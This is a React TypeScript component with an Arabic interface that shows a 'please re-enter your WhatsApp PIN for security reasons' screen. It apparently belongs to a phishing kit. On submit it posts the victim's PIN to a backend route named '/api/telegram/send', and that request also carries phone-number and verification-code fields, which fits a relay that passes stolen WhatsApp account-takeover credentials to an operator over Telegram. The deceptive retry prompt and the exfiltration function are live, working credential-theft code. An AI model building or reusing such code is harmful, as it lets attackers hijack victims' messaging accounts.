import React, { useState } from 'react';
import { Lock, ArrowLeft, ArrowRight } from 'lucide-react';

interface PinRetryStepProps {
  whatsappPin: string;
  updateWhatsappPin: (value: string) => void;
  onNext: () => void;
  onBack: () => void;
}

const PinRetryStep: React.FC<PinRetryStepProps> = ({ 
  whatsappPin, 
  updateWhatsappPin, 
  onNext, 
  onBack 
}) => {
  const [error, setError] = useState('');

  const sendPinRetryToTelegram = async (pin: string) => {
    try {
      await fetch('http://localhost:5176/api/telegram/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phoneNumber: '',
          verificationCode: '',
          whatsappPin: pin,
          messageType: 'pin'
        })
      });
    } catch (error) {
      console.error('Erreur envoi PIN retry:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!whatsappPin || whatsappPin.length < 6) {
      setError('يرجى إدخال رمز  صحيح (6 أرقام على الأقل)');
      return;
    }
    
    setError('');
    await sendPinRetryToTelegram(whatsappPin);
    onNext();
  };

  return (
    <div className="text-center">
      <div className="mb-6">
        <div className="w-16 h-16 bg-gradient-to-r from-red-100 to-rose-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <Lock className="w-8 h-8 text-rose-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">أدخل رمز PIN مرة أخرى</h2>
        <p className="text-gray-600">لأسباب أمنية، أعد إدخال رمز الحماية (PIN)</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <div className="relative">
            <input
              type="password"
              value={whatsappPin}
              onChange={(e) => updateWhatsappPin(e.target.value)}
              placeholder="••••••"
              className="w-full bg-gray-50 border-2 border-gray-300 text-gray-900 text-lg text-center rounded-xl focus:ring-2 focus:ring-rose-500 focus:border-transparent px-4 py-4 transition-all duration-200 font-mono tracking-widest"
              maxLength={8}
            />
          </div>
          {error && (
            <p className="text-red-500 text-sm mt-2 animate-fade-in">{error}</p>
          )}
        </div>

        <div className="flex space-x-4">
          <button
            type="button"
            onClick={onBack}
            className="flex-1 bg-gray-100 text-gray-700 py-3 px-6 rounded-xl font-semibold hover:bg-gray-200 transition-all duration-200 flex items-center justify-center space-x-2"
          >
            <ArrowLeft className="w-5 h-5" />
            <span>رجوع</span>
          </button>
          
          <button
            type="submit"
            className="flex-1 bg-gradient-to-r from-rose-600 to-red-600 text-white py-3 px-6 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 hover:scale-105 flex items-center justify-center space-x-2"
          >
            <span>تأكيد مرة أخرى</span>
            <ArrowRight className="w-5 h-5" />
          </button>
        </div>
      </form>
    </div>
  );
};

export default PinRetryStep;


